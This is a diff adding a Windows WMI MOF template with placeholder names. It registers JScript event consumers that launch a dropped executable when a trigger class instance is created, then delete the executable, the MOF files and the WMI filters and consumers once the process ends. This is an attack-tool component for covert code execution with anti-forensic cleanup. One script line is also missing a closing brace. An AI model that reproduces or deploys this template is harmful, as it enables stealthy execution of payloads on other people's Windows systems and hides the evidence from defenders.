@@ -1,0 +1,97 @@
+#pragma namespace ("\\\\.\\Root\\cimv2")
+
+class $$$MSClassConsumer_ClassName$$$
+{
+  [key] string Name;
+};
+
+class ActiveScriptEventConsumer : __EventConsumer
+{
+  [key] string Name;
+  [not_null] string ScriptingEngine;
+  [Template] string ScriptText;
+  string ScriptFilename;
+  uint32 KillTimeout = 0;
+};
+
+instance of __Win32Provider as $P
+{
+  Name = "ActiveScriptEventConsumer";
+  Clsid = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
+  PerUserInitialization = TRUE;
+};
+
+instance of __EventConsumerProviderRegistration
+{
+  Provider = $P;
+  ConsumerClassNames = {"ActiveScriptEventConsumer"};
+};
+
+instance of ActiveScriptEventConsumer as $Cons
+{
+Name = "$$$Event_Consumer_Name$$$";
+ScriptingEngine = "JScript";
+ScriptText = "\n"
+"try {var s = new ActiveXObject(\"Wscript.Shell\");\n"
+"s.Run(\"$$$$FULLPATH_EXE_FILENAME_ESCAPED$$$$\");} catch (err) {};\n"
+"sv = GetObject(\"winmgmts:root\\\\cimv2\");"
+"try {sv.Delete(\"$$$MSClassConsumer_ClassName$$$\");} catch (err) {};"
+"try {sv.Delete(\"__EventFilter.Name='$$$Filter_Name$$$'\");} catch (err) {};"
+"try {sv.Delete(\"ActiveScriptEventConsumer.Name='$$$Event_Consumer_Name$$$'\");} catch(err) {};";
+};
+
+instance of ActiveScriptEventConsumer as $Cons2
+{
+
+Name = "$$$Event_Consumer_Name2$$$";
+ScriptingEngine = "JScript";
+ScriptText = "\n"
+"var objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\n"
+"try {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\$$$$MOF_FILENAME$$$$\");\n"
+"f1.Delete(true);} catch(err) {};\n"
+"try {\n"
+"var f2 = objfs.GetFile(\"$$$$FULLPATH_EXE_FILENAME_ESCAPED$$$$\");\n"
+"try {f2.Delete(true); } catch(err) {};\n"
+"var s = GetObject(\"winmgmts:root\\\\cimv2\");"
+"try {s.Delete(\"__EventFilter.Name='$$$Filter_Name2$$$'\");} catch (err) {};"
+"try {s.Delete(\"ActiveScriptEventConsumer.Name='$$$Event_Consumer_Name2$$$'\"); catch (err) {};\n"
+"} catch(err) {};\n"
+"try {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\$$$$MOFTRIGGER_FILENAME$$$$\");\n"
+"f1.Delete(true);} catch(err) {};";
+};
+
+instance of __EventFilter as $Filt
+{
+  Name = "$$$Filter_Name$$$";
+  Query = "SELECT * FROM __InstanceCreationEvent"
+    " WHERE TargetInstance.__class = \"$$$MSClassConsumer_ClassName$$$\"";
+  QueryLanguage = "WQL";
+};
+
+instance of __EventFilter as $Filt2
+{
+  Name = "$$$Filter_Name2$$$";
+  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 "
+      "WHERE TargetInstance ISA \"Win32_Process\" "
+      "AND TargetInstance.Name = \"$$$$EXE_FILENAME$$$$\"";
+  QueryLanguage = "WQL";
+};
+
+instance of __FilterToConsumerBinding as $bind
+{
+    Filter = $Filt;
+    Consumer = $Cons;
+};
+
+instance of __FilterToConsumerBinding as $bind2
+{
+    Filter = $Filt2;
+    Consumer = $Cons2;
+};
+
+
+instance of $$$MSClassConsumer_ClassName$$$ as $myclass
+{
+  Name = "$$$MSClassConsumer_InstName$$$";
+};
+
